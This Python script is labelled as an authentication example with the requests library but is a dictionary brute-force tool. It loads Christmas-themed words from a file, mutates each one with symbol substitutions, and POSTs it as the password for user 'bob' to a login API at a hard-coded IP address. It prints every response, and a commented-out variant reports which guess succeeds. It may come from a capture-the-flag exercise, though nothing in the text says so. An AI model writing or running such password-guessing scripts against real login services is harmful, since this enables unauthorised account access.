# Authentication in Requests with HTTPBasicAuth
import requests
from requests.auth import HTTPBasicAuth
import sys
import os

messageFile = "words.txt"
christmasWords = []

with open(os.path.join(sys.path[0], messageFile), "r") as f:
    #print(f.read())    #print the file that was loaded to check that it all loads properly
    Lines = f.readlines()
    for line in Lines:
        line = line.strip()
        christmasWords.append(line.lower())
    f.close()

url = 'http://67.205.184.56/api/login'
myUsername = 'bob'
myPassword = ''

for word in christmasWords:
    myPassword = word + '$'
#    myPassword = word + '@'
#    myPassword =  word.replace('s', '$')
#    myPassword =  word.replace('a', '@')
#    myPassword =  myPassword.replace('a', '@')

    # Fill in your details here to be posted to the login form.
    payload = {
        'password': myPassword,
        'username': 'bob'
    }

    # Use 'with' to ensure the session context is closed after use.
    with requests.Session() as s:
        response = requests.post(url, json={'username': 'bob', 'password': myPassword})
        # print the html returned or something more intelligent to see if it's a successful login page.
        #print (p.text)
        print("Password: ", myPassword, " Status code: ", response.status_code)
        print("Printing Entire Result")
        print(response.json())
        
        

    # An authorised request.
    #r = s.get('A protected web page url')
    #print (r.text)

'''
    auth = HTTPBasicAuth(myUsername, myPassword)
    response = requests.get(url, auth=auth)
    if response.status_code != 401:
        print("SUCCESS! ", myPassword)    
    print("ATTEMPT: ", myPassword, " RESPONSE: ", response)
'''